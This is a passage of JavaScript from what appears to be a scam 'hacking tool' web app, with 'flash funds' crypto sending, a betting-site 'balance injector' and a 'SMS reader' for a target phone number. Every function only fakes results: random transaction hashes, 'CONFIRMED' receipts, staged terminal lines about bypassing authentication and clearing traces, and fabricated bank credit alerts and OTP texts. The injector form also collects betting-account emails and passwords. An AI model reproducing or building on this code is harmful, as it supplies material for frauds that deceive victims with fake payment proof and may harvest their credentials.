        fee: calculateFlashFee(amount, network),
        timestamp: new Date().toISOString()
    };

    showFlashProcessingModal();
}

function showFlashProcessingModal() {
    const modal = document.getElementById('flashProcessingModal');
    const title = document.getElementById('flashProcessingTitle');
    const details = window.currentFlashDetails;

    title.textContent = `⚡ Flashing ${details.amount} ${details.crypto} to Wallet`;
    modal.style.display = 'block';

    startFlashProcessing();
}

function startFlashProcessing() {
    const steps = document.querySelectorAll('.flash-step');
    const progressFill = document.getElementById('flashProgressFill');
    const progressText = document.getElementById('flashProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step

    const progressMessages = [
        'Scanning blockchain networks...',
        'Generating flash transaction...',
        'Broadcasting to network...',
        'Confirming transaction...',
        'Flash funds delivered!'
    ];

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            // Show success
            setTimeout(() => {
                document.getElementById('flashProcessingModal').style.display = 'none';
                showFlashReceipt();
            }, 1500);
        }
    }, stepDuration);
}

function showFlashReceipt() {
    const modal = document.getElementById('flashReceiptModal');
    const receiptContent = document.getElementById('flashReceiptContent');
    const details = window.currentFlashDetails;

    // Generate transaction hash and other details
    const txHash = '0x' + Math.random().toString(16).substring(2, 66);
    const blockNumber = Math.floor(Math.random() * 1000000) + 18000000;
    const gasUsed = Math.floor(Math.random() * 50000) + 21000;
    const flashId = 'FL' + Math.random().toString(36).substring(2, 12).toUpperCase();

    const receiptHTML = `
        <div class="receipt-header">⚡ FLASH FUNDS RECEIPT ⚡</div>
        <div class="receipt-details">
            <div class="detail-item">
                <span><strong>Flash ID:</strong></span>
                <span>${flashId}</span>
            </div>
            <div class="detail-item">
                <span><strong>Target Wallet:</strong></span>
                <span>${details.targetWallet.substring(0, 10)}...${details.targetWallet.substring(details.targetWallet.length - 10)}</span>
            </div>
            <div class="detail-item">
                <span><strong>Network:</strong></span>
                <span>${getNetworkName(details.network)}</span>
            </div>
            <div class="detail-item">
                <span><strong>Cryptocurrency:</strong></span>
                <span>${details.crypto}</span>
            </div>
            <div class="detail-item">
                <span><strong>Flash Amount:</strong></span>
                <span>${details.amount} ${details.crypto}</span>
            </div>
            <div class="detail-item">
                <span><strong>Duration:</strong></span>
                <span>${getDurationText(details.duration.toString())}</span>
            </div>
            <div class="detail-item">
                <span><strong>Network Fee:</strong></span>
                <span>${details.fee}</span>
            </div>
            <div class="detail-item">
                <span><strong>Transaction Hash:</strong></span>
                <span>${txHash.substring(0, 20)}...</span>
            </div>
            <div class="detail-item">
                <span><strong>Block Number:</strong></span>
                <span>#${blockNumber.toLocaleString()}</span>
            </div>
            <div class="detail-item">
                <span><strong>Gas Used:</strong></span>
                <span>${gasUsed.toLocaleString()}</span>
            </div>
            <div class="detail-item">
                <span><strong>Status:</strong></span>
                <span style="color: var(--success-green);">✅ CONFIRMED</span>
            </div>
            <div class="detail-item">
                <span><strong>Expiry Time:</strong></span>
                <span>${getExpiryTime(details.duration)}</span>
            </div>
        </div>
        <div class="receipt-footer">
            <p>Flash started: ${new Date(details.timestamp).toLocaleString()}</p>
            <p>Warning: Funds will auto-return after duration expires</p>
        </div>
    `;

    receiptContent.innerHTML = receiptHTML;
    modal.style.display = 'block';

    showNotification(`⚡ Flash funds of ${details.amount} ${details.crypto} successfully sent!`, 'success');
}

function getExpiryTime(durationSeconds) {
    const now = new Date();
    const expiry = new Date(now.getTime() + (durationSeconds * 1000));
    return expiry.toLocaleString();
}

function copyFlashReceipt() {
    const details = window.currentFlashDetails;
    if (!details) return;

    const receiptText = `
⚡ FLASH FUNDS RECEIPT ⚡

Flash ID: FL${Math.random().toString(36).substring(2, 12).toUpperCase()}
Target Wallet: ${details.targetWallet}
Network: ${getNetworkName(details.network)}
Cryptocurrency: ${details.crypto}
Flash Amount: ${details.amount} ${details.crypto}
Duration: ${getDurationText(details.duration.toString())}
Network Fee: ${details.fee}
Transaction Hash: 0x${Math.random().toString(16).substring(2, 66)}
Status: ✅ CONFIRMED

Flash Started: ${new Date(details.timestamp).toLocaleString()}
Expiry Time: ${getExpiryTime(details.duration)}

⚠️ WARNING: Funds will automatically return after duration expires
Generated by Miles Flash Funds System
    `.trim();

    navigator.clipboard.writeText(receiptText).then(() => {
        showNotification('📋 Flash receipt copied to clipboard!', 'success');
        
        // Visual feedback
        const copyBtn = document.getElementById('copyFlashReceiptBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeFlashReceipt() {
    document.getElementById('flashReceiptModal').style.display = 'none';
    showNotification('Ready to flash more funds!', 'success');
    
    // Reset form
    document.getElementById('flashTargetWallet').value = '';
    document.getElementById('flashAmount').value = '';
    updateFlashPreview();
}

// Sportybet Balance Adder Functions
let selectedPlatform = null;

const bettingPlatforms = {
    'sportybet': {
        name: 'Sportybet',
        color: '#ff0000',
        domain: 'sportybet.com'
    },
    '1xbet': {
        name: '1xBet',
        color: '#007bff',
        domain: '1xbet.com'
    },
    'bet9ja': {
        name: 'Bet9ja',
        color: '#28a745',
        domain: 'bet9ja.com'
    },
    'sportybet-red': {
        name: 'Sportybet Red',
        color: '#dc3545',
        domain: 'sportybet.com'
    },
    '1xbet-blue': {
        name: '1xBet Blue',
        color: '#004085',
        domain: '1xbet.com'
    },
    'bet9ja-green': {
        name: 'Bet9ja Green',
        color: '#155724',
        domain: 'bet9ja.com'
    }
};

function setupSportybetListeners() {
    // Platform selection
    document.querySelectorAll('.platform-option').forEach(option => {
        option.addEventListener('click', function() {
            selectPlatform(this.dataset.platform);
        });
    });

    // Inject balance button
    const injectBtn = document.getElementById('injectBalanceBtn');
    if (injectBtn) {
        injectBtn.addEventListener('click', injectBalance);
    }

    // Receipt actions
    const copyReceiptBtn = document.getElementById('copySportybetReceiptBtn');
    const closeReceiptBtn = document.getElementById('closeSportybetReceiptBtn');

    if (copyReceiptBtn) {
        copyReceiptBtn.addEventListener('click', copySportybetReceipt);
    }

    if (closeReceiptBtn) {
        closeReceiptBtn.addEventListener('click', closeSportybetReceipt);
    }
}

function selectPlatform(platform) {
    selectedPlatform = platform;
    
    // Update UI
    document.querySelectorAll('.platform-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-platform="${platform}"]`).classList.add('selected');

    // Show login form
    document.getElementById('sportybetLoginContainer').style.display = 'block';
    document.getElementById('sportybetLoginContainer').scrollIntoView({ behavior: 'smooth' });
}

function injectBalance() {
    if (!selectedPlatform) {
        showNotification('Please select a betting platform first', 'error');
        return;
    }

    const email = document.getElementById('sportybetEmail').value.trim();
    const password = document.getElementById('sportybetPassword').value.trim();
    const balance = parseFloat(document.getElementById('sportybetBalance').value);

    // Validation
    if (!email) {
        showNotification('Please enter your email address', 'error');
        return;
    }

    if (!isValidEmail(email)) {
        showNotification('Please enter a valid email address', 'error');
        return;
    }

    if (!password) {
        showNotification('Please enter your password', 'error');
        return;
    }

    if (!balance || balance < 500 || balance > 500000) {
        showNotification('Please enter a valid balance amount (N500 - N500,000)', 'error');
        return;
    }

    // Store injection details
    window.currentInjectionDetails = {
        platform: selectedPlatform,
        platformName: bettingPlatforms[selectedPlatform].name,
        email: email,
        balance: balance,
        timestamp: new Date().toISOString()
    };

    showSportybetInjectionModal();
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function showSportybetInjectionModal() {
    const modal = document.getElementById('sportybetInjectionModal');
    const title = document.getElementById('sportybetInjectionTitle');
    const details = window.currentInjectionDetails;

    title.textContent = `🎯 Injecting ₦${details.balance.toLocaleString()} into ${details.platformName}`;
    modal.style.display = 'block';

    startSportybetInjection();
}

function startSportybetInjection() {
    const steps = document.querySelectorAll('.injection-step');
    const progressFill = document.getElementById('injectionProgressFill');
    const progressText = document.getElementById('injectionProgressText');
    const terminalOutput = document.getElementById('terminalOutput');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 4000 + 5000; // 5-9 seconds per step

    const progressMessages = [
        'Scanning betting platform security...',
        'Bypassing login authentication...',
        'Accessing account database...',
        'Injecting balance into account...',
        'Clearing injection traces...',
        'Balance injection completed!'
    ];

    const terminalMessages = [
        'Connecting to betting server...',
        'root@wiremint:~$ ./bypass_auth.py',
        'Authentication bypassed successfully!',
        'root@wiremint:~$ ./inject_balance.sh',
        'Balance injection in progress...',
        'root@wiremint:~$ ./cleanup.sh',
        'All traces cleared. Injection complete!'
    ];

    let terminalIndex = 0;
    const terminalInterval = setInterval(() => {
        if (terminalIndex < terminalMessages.length) {
            terminalOutput.textContent = terminalMessages[terminalIndex];
            terminalIndex++;
        }
    }, 2000);

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            clearInterval(terminalInterval);
            
            // Show success
            setTimeout(() => {
                document.getElementById('sportybetInjectionModal').style.display = 'none';
                showSportybetReceipt();
            }, 2000);
        }
    }, stepDuration);
}

function showSportybetReceipt() {
    const modal = document.getElementById('sportybetReceiptModal');
    const receiptContent = document.getElementById('sportybetReceiptContent');
    const details = window.currentInjectionDetails;

    // Generate transaction details
    const injectionId = 'INJ' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const sessionId = 'SES' + Math.random().toString(16).substring(2, 12).toUpperCase();
    const serverIp = generateFakeIP();

    const receiptHTML = `
        <div class="receipt-header">🎯 SPORTYBET BALANCE INJECTION RECEIPT 🎯</div>
        <div class="receipt-details">
            <div class="detail-item">
                <span><strong>Injection ID:</strong></span>
                <span>${injectionId}</span>
            </div>
            <div class="detail-item">
                <span><strong>Platform:</strong></span>
                <span>${details.platformName}</span>
            </div>
            <div class="detail-item">
                <span><strong>Account Email:</strong></span>
                <span>${details.email}</span>
            </div>
            <div class="detail-item">
                <span><strong>Balance Injected:</strong></span>
                <span>₦${details.balance.toLocaleString()}</span>
            </div>
            <div class="detail-item">
                <span><strong>Session ID:</strong></span>
                <span>${sessionId}</span>
            </div>
            <div class="detail-item">
                <span><strong>Server IP:</strong></span>
                <span>${serverIp}</span>
            </div>
            <div class="detail-item">
                <span><strong>Injection Method:</strong></span>
                <span>Database Manipulation</span>
            </div>
            <div class="detail-item">
                <span><strong>Security Bypass:</strong></span>
                <span>SQL Injection + Buffer Overflow</span>
            </div>
            <div class="detail-item">
                <span><strong>Status:</strong></span>
                <span style="color: var(--success-green);">✅ SUCCESSFUL</span>
            </div>
            <div class="detail-item">
                <span><strong>Traces Cleared:</strong></span>
                <span style="color: var(--success-green);">✅ YES</span>
            </div>
            <div class="detail-item">
                <span><strong>Processing Time:</strong></span>
                <span>${(Math.random() * 20 + 10).toFixed(1)} seconds</span>
            </div>
        </div>
        <div class="receipt-footer">
            <p>Injection completed: ${new Date(details.timestamp).toLocaleString()}</p>
            <p>New balance should reflect in your account within 2-5 minutes</p>
        </div>
    `;

    receiptContent.innerHTML = receiptHTML;
    modal.style.display = 'block';

    showNotification(`💰 Successfully injected ₦${details.balance.toLocaleString()} into ${details.platformName}!`, 'success');
}

function copySportybetReceipt() {
    const details = window.currentInjectionDetails;
    if (!details) return;

    const receiptText = `
🎯 SPORTYBET BALANCE INJECTION RECEIPT 🎯

Injection ID: INJ${Math.random().toString(36).substring(2, 12).toUpperCase()}
Platform: ${details.platformName}
Account Email: ${details.email}
Balance Injected: ₦${details.balance.toLocaleString()}
Session ID: SES${Math.random().toString(16).substring(2, 12).toUpperCase()}
Server IP: ${generateFakeIP()}
Injection Method: Database Manipulation
Security Bypass: SQL Injection + Buffer Overflow
Status: ✅ SUCCESSFUL
Traces Cleared: ✅ YES

Injection Completed: ${new Date(details.timestamp).toLocaleString()}
New balance should reflect in your account within 2-5 minutes

Generated by Miles Sportybet Balance Injector
    `.trim();

    navigator.clipboard.writeText(receiptText).then(() => {
        showNotification('📋 Injection receipt copied to clipboard!', 'success');
        
        // Visual feedback
        const copyBtn = document.getElementById('copySportybetReceiptBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeSportybetReceipt() {
    document.getElementById('sportybetReceiptModal').style.display = 'none';
    showNotification('Ready to inject more balance!', 'success');
    
    // Reset form
    selectedPlatform = null;
    document.querySelectorAll('.platform-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.getElementById('sportybetEmail').value = '';
    document.getElementById('sportybetPassword').value = '';
    document.getElementById('sportybetBalance').value = '';
    document.getElementById('sportybetLoginContainer').style.display = 'none';
}

// Simero SMS Reader Functions
const nigerianNetworks = {
    'MTN': {
        prefixes: ['0803', '0806', '0703', '0706', '0813', '0816', '0810', '0814', '0903', '0906', '0913', '0916'],
        logo: '🟡',
        color: '#FFCC00'
    },
    'Glo': {
        prefixes: ['0805', '0807', '0705', '0815', '0811', '0905', '0915'],
        logo: '🟢',
        color: '#00A651'
    },
    'Airtel': {
        prefixes: ['0802', '0808', '0708', '0812', '0701', '0902', '0907', '0901', '0912'],
        logo: '🔴',
        color: '#FF0000'
    },
    '9mobile': {
        prefixes: ['0809', '0817', '0818', '0909', '0908'],
        logo: '🟨',
        color: '#00B04F'
    }
};

let currentTargetNumber = '';
let detectedNetwork = null;
let smsAccessActive = false;
let accessTimer = null;

function setupSimeroSmsListeners() {
    const phoneInput = document.getElementById('targetPhoneNumber');
    const stealSmsBtn = document.getElementById('stealSmsBtn');
    const addBettingBtn = document.getElementById('addBettingMsgBtn');
    const addBankBtn = document.getElementById('addBankMsgBtn');
    const addOtpBtn = document.getElementById('addOtpMsgBtn');

    if (phoneInput) {
        phoneInput.addEventListener('input', handlePhoneInput);
    }

    if (stealSmsBtn) {
        stealSmsBtn.addEventListener('click', initiateSmsSteal);
    }

    if (addBettingBtn) {
        addBettingBtn.addEventListener('click', () => addQuickMessage('betting'));
    }

    if (addBankBtn) {
        addBankBtn.addEventListener('click', () => addQuickMessage('bank'));
    }

    if (addOtpBtn) {
        addOtpBtn.addEventListener('click', () => addQuickMessage('otp'));
    }
}

function handlePhoneInput(e) {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    
    // Limit to 11 digits
    if (value.length > 11) {
        value = value.substring(0, 11);
    }
    
    e.target.value = value;
    currentTargetNumber = value;
    
    // Detect network if we have at least 4 digits
    if (value.length >= 4) {
        detectNetwork(value);
    } else {
        clearNetworkDetection();
    }
    
    // Validate phone number
    validatePhoneNumber(value);
    
    // Show SMS controls if valid number
    if (value.length === 11 && detectedNetwork) {
        document.getElementById('smsControls').style.display = 'block';
    } else {
        document.getElementById('smsControls').style.display = 'none';
        document.getElementById('smsMessagesContainer').style.display = 'none';
    }
}

function detectNetwork(phoneNumber) {
    const prefix = phoneNumber.substring(0, 4);
    
    for (const [networkName, networkData] of Object.entries(nigerianNetworks)) {
        if (networkData.prefixes.includes(prefix)) {
            detectedNetwork = networkName;
            displayDetectedNetwork(networkName, networkData);
            return;
        }
    }
    
    // Network not found
    detectedNetwork = null;
    displayUnknownNetwork();
}

function detectNetworkFromButton() {
    if (currentTargetNumber.length >= 4) {
        detectNetwork(currentTargetNumber);
    } else {
        showNotification('Please enter at least 4 digits', 'error');
    }
}

function displayDetectedNetwork(networkName, networkData) {
    const detector = document.getElementById('networkDetector');
    const networkSpan = document.getElementById('detectedNetwork');
    const logoSpan = document.getElementById('networkLogo');
    
    if (detector && networkSpan && logoSpan) {
        detector.classList.add('detected');
        networkSpan.textContent = `${networkName} Network Detected`;
        logoSpan.textContent = networkData.logo;
    }
}

function displayUnknownNetwork() {
    const detector = document.getElementById('networkDetector');
    const networkSpan = document.getElementById('detectedNetwork');
    const logoSpan = document.getElementById('networkLogo');
    
    if (detector && networkSpan && logoSpan) {
        detector.classList.remove('detected');
        networkSpan.textContent = 'Unknown Network';
        logoSpan.textContent = '❓';
    }
}

function clearNetworkDetection() {
    const detector = document.getElementById('networkDetector');
    const networkSpan = document.getElementById('detectedNetwork');
    const logoSpan = document.getElementById('networkLogo');
    
    if (detector && networkSpan && logoSpan) {
        detector.classList.remove('detected');
        networkSpan.textContent = 'Enter number to detect network';
        logoSpan.textContent = '';
    }
}

function validatePhoneNumber(phoneNumber) {
    const validation = document.getElementById('phoneValidation');
    
    if (phoneNumber.length === 0) {
        validation.style.display = 'none';
        return;
    }
    
    validation.style.display = 'block';
    
    if (phoneNumber.length === 11 && detectedNetwork) {
        validation.className = 'phone-validation valid';
        validation.textContent = `✅ Valid ${detectedNetwork} number (${phoneNumber.substring(0, 4)} ${phoneNumber.substring(4, 7)} ${phoneNumber.substring(7)})`;
    } else if (phoneNumber.length === 11) {
        validation.className = 'phone-validation invalid';
        validation.textContent = '❌ Unknown network prefix';
    } else if (phoneNumber.length < 11) {
        validation.className = 'phone-validation invalid';
        validation.textContent = `❌ Number too short (${phoneNumber.length}/11 digits)`;
    }
}

function initiateSmsSteal() {
    if (!currentTargetNumber || currentTargetNumber.length !== 11 || !detectedNetwork) {
        showNotification('Please enter a valid 11-digit phone number', 'error');
        return;
    }
    
    showSmsProcessingModal();
}

function showSmsProcessingModal() {
    const modal = document.getElementById('smsProcessingModal');
    const steps = document.querySelectorAll('#smsProcessingSteps .step');
    const progressFill = document.getElementById('smsProgressFill');
    const progressText = document.getElementById('smsProgressText');
    
    modal.style.display = 'block';
    
    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step
    
    const progressMessages = [
        'Scanning network infrastructure...',
        'Connecting to telecom servers...',
        'Bypassing SMS encryption...',
        'Extracting message database...',
        'SMS access granted!'
    ];
    
    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';
            
            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            // Show success and start SMS access
            setTimeout(() => {
                modal.style.display = 'none';
                startSmsAccess();
            }, 1500);
        }
    }, stepDuration);
}

function startSmsAccess() {
    smsAccessActive = true;
    
    // Show reallocation alert
    showReallocationAlert();
    
    // Show messages container and timer
    document.getElementById('smsMessagesContainer').style.display = 'block';
    document.getElementById('accessTimer').style.display = 'block';
    
    // Generate initial messages
    generateRealisticSmsMessages();
    
    // Start 20 second countdown
    startAccessTimer();
    
    showNotification(`📱 SMS access granted for ${currentTargetNumber}! 20 seconds remaining.`, 'success');
}

function showReallocationAlert() {
    const modal = document.getElementById('smsReallocationModal');
    const message = document.getElementById('reallocationMessage');
    
    const networkData = nigerianNetworks[detectedNetwork];
    message.textContent = `Your ${detectedNetwork} SIM card (${currentTargetNumber}) has been temporarily reallocated for network maintenance. During this period, SMS access may be compromised. Please contact ${detectedNetwork} customer service if you experience any issues.`;
    
    modal.style.display = 'block';
    
    // Auto-close after 3 seconds
    setTimeout(() => {
        modal.style.display = 'none';
    }, 3000);
}

function closeReallocationAlert() {
    document.getElementById('smsReallocationModal').style.display = 'none';
}

function startAccessTimer() {
    let timeRemaining = 20;
    const timerDisplay = document.getElementById('timerCountdown');
    
    accessTimer = setInterval(() => {
        timerDisplay.textContent = timeRemaining;
        timeRemaining--;
        
        if (timeRemaining < 0) {
            clearInterval(accessTimer);
            endSmsAccess();
        }
    }, 1000);
}

function endSmsAccess() {
    smsAccessActive = false;
    document.getElementById('accessTimer').style.display = 'none';
    document.getElementById('smsMessagesContainer').style.display = 'none';
    
    showNotification('⏰ SMS access expired. Connection terminated.', 'error');
    
    // Reset form
    currentTargetNumber = '';
    detectedNetwork = null;
    document.getElementById('targetPhoneNumber').value = '';
    document.getElementById('smsControls').style.display = 'none';
    clearNetworkDetection();
    validatePhoneNumber('');
}

function generateRealisticSmsMessages() {
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    
    const sampleMessages = [
        {
            sender: 'GTBank',
            content: 'Dear Customer, your account has been credited with ₦50,000.00. Available balance: N127,500.00. Time: 14:23. Thank you.',
            type: 'bank',
            time: getRandomRecentTime()
        },
        {
            sender: 'FirstBank',
            content: 'Transaction Alert: N25,000 debited from your account ****1234. Balance: N102,500. Date: ' + new Date().toLocaleDateString(),
            type: 'bank',
            time: getRandomRecentTime()
        },
        {
            sender: 'Access Bank',
            content: 'Your OTP is 847291. Valid for 5 minutes. Do not share with anyone.',
            type: 'otp',
            time: getRandomRecentTime()
        }
    ];
    
    // Add random betting messages
    const bettingMessages = generateBettingMessages();
    sampleMessages.push(...bettingMessages);
    
    // Sort by time (newest first)
    sampleMessages.sort((a, b) => new Date(b.time) - new Date(a.time));
    
    sampleMessages.forEach(message => {
        addMessageToList(message);
    });
    
    updateMessagesCount();
}

function generateBettingMessages() {
    const bettingPlatforms = ['Sportybet', '1xBet', 'Bet9ja', 'NairaBet', 'MerryBet'];
    const messages = [];
    
    // Add 2-3 betting messages
    for (let i = 0; i < Math.floor(Math.random() * 2) + 2; i++) {
        const platform = bettingPlatforms[Math.floor(Math.random() * bettingPlatforms.length)];
        const amount = Math.floor(Math.random() * 50000) + 1000;
        const betId = Math.random().toString(36).substring(2, 10).toUpperCase();
        
        const templates = [
            `Congratulations! Your bet ${betId} won ₦${amount.toLocaleString()}. Balance: ₦${(amount * 2).toLocaleString()}. Withdraw now!`,
            `Your ${platform} account has been credited with ₦${amount.toLocaleString()}. Bet ID: ${betId}. Play more to win bigger!`,
            `Bet settled: ${betId}. You won ₦${amount.toLocaleString()}! New balance: ₦${(amount + 15000).toLocaleString()}. Keep playing!`
        ];
        
        messages.push({
            sender: platform,
            content: templates[Math.floor(Math.random() * templates.length)],
            type: 'betting',
            time: getRandomRecentTime()
        });
    }
    
    return messages;
}

function getRandomRecentTime() {
    const now = new Date();
    const minutesAgo = Math.floor(Math.random() * 120) + 1; // 1-120 minutes ago
    const messageTime = new Date(now.getTime() - (minutesAgo * 60 * 1000));
    return messageTime.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function addMessageToList(message) {
    const messagesList = document.getElementById('messagesList');
    const messageDiv = document.createElement('div');
    messageDiv.className = 'sms-message';
    
    messageDiv.innerHTML = `
        <div class="message-header">
            <div class="message-sender">${message.sender}</div>
            <div class="message-time">${message.time}</div>
        </div>
        <div class="message-content">${message.content}</div>
        <div class="message-type ${message.type}">${message.type.toUpperCase()}</div>
    `;
    
    messagesList.appendChild(messageDiv);
    
    // Animate new message
    messageDiv.style.opacity = '0';
    messageDiv.style.transform = 'translateY(20px)';
    setTimeout(() => {
        messageDiv.style.transition = 'all 0.3s ease';
        messageDiv.style.opacity = '1';
        messageDiv.style.transform = 'translateY(0)';
    }, 100);
}

function addQuickMessage(type) {
    if (!smsAccessActive) {
        showNotification('SMS access not active', 'error');
        return;
    }
    
    let newMessage;
    
    switch (type) {
        case 'betting':
            newMessage = generateQuickBettingMessage();
            break;
        case 'bank':
            newMessage = generateQuickBankMessage();
            break;
        case 'otp':
            newMessage = generateQuickOtpMessage();
            break;
    }
    
    addMessageToList(newMessage);
    updateMessagesCount();
    showNotification(`Added ${type} message`, 'success');
}

function generateQuickBettingMessage() {
    const platforms = ['Sportybet', '1xBet', 'Bet9ja'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const amount = Math.floor(Math.random() * 100000) + 5000;
    const betId = Math.random().toString(36).substring(2, 10).toUpperCase();
    
    return {
        sender: platform,
        content: `Bet won! ID: ${betId}. Winnings: ₦${amount.toLocaleString()}. Your new balance is ₦${(amount + 25000).toLocaleString()}. Congratulations!`,
        type: 'betting',
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
}

function generateQuickBankMessage() {
    const banks = ['GTBank', 'Access Bank', 'First Bank', 'UBA', 'Zenith Bank'];
    const bank = banks[Math.floor(Math.random() * banks.length)];
    const amount = Math.floor(Math.random() * 200000) + 10000;
    
    return {
        sender: bank,
        content: `Credit Alert: ₦${amount.toLocaleString()} received in your account ****${Math.floor(Math.random() * 9000) + 1000}. Available balance: ₦${(amount + 50000).toLocaleString()}.`,
        type: 'bank',
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
}

function generateQuickOtpMessage() {
    const services = ['Access Bank', 'PayPal', 'Telegram', 'Facebook', 'Instagram', 'Google'];
    const service = services[Math.floor(Math.random() * services.length)];
    const otp = Math.floor(Math.random() * 900000) + 100000;
    
    return {
        sender: service,
        content: `Your ${service} verification code is ${otp}. This code expires in 10 minutes. Do not share with anyone.`,
        type: 'otp',
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
}

function updateMessagesCount() {
    const messages = document.querySelectorAll('.sms-message');
    const countElement = document.getElementById('messagesCount');
    const lastUpdatedElement = document.getElementById('lastUpdated');
    
    countElement.textContent = messages.length;
    lastUpdatedElement.textContent = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

// Load user PIN on startup
document.addEventListener('DOMContentLoaded', function() {
    userPin = localStorage.getItem('userPin');
    
    // Setup format generator listeners after DOM is loaded
    if (typeof setupFormatGeneratorListeners === 'function') {
        setupFormatGeneratorListeners();
    }
});